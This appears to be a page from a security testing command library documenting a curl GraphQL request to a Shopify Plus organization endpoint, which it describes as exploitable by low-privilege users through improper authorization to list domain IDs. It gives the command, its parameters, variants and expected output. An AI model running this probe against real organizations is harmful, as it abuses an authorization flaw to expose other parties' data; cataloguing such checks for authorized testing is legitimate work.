---
data: >-
  curl -X POST 'https://shopify.plus/34946971/stores/api' -H 'Content-Type:
  application/json' -H 'Authorization: Bearer YOUR_TOKEN' -d
  '{"query":"query{organization{domains{id}}}"}'
tags:
  - graphql
  - query
  - shopify-plus
type: command
executor: bash
platforms:
  - Web
id: 65806163-b3f1-4769-bbea-89421dc2a9a1
created_at: '2025-12-14T17:29:20.177Z'
updated_at: '2025-12-14T17:29:20.177Z'
verified: false
validated: true
submitted: true
---
# graphql-query-organization-domains

## Command

```bash
curl -X POST 'https://shopify.plus/34946971/stores/api' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{"query":"query{organization{domains{id}}}"}'
```

## Description

This command sends a GraphQL query to the Shopify Plus stores/api endpoint to retrieve organization domain IDs, exploitable by low-priv users due to improper authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://shopify.plus/34946971/stores/api` | Target GraphQL endpoint (replace 34946971 with org ID) | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Auth header with session token | Yes |
| `-d '{"query":"query{organization{domains{id}}}"}'` | GraphQL query payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://shopify.plus/ORG_ID/stores/api' -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{"query":"query{organization{domains{id}}}"}'
```

### Advanced Usage

Add verbose output with `-v` flag for debugging:

```bash
curl -v -X POST 'https://shopify.plus/ORG_ID/stores/api' -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{"query":"query{organization{domains{id}}}"}'
```

## Expected Output

JSON response like {"data":{"organization":{"domains":[{"id":"gid://shopify/OrganizationDomain/123"}]}}}; errors if unauthorized.

## Related

- [[commands/graphql-enforce-saml-domains]]
- [[procedures/Query-Organization-Domains-for-ID]]
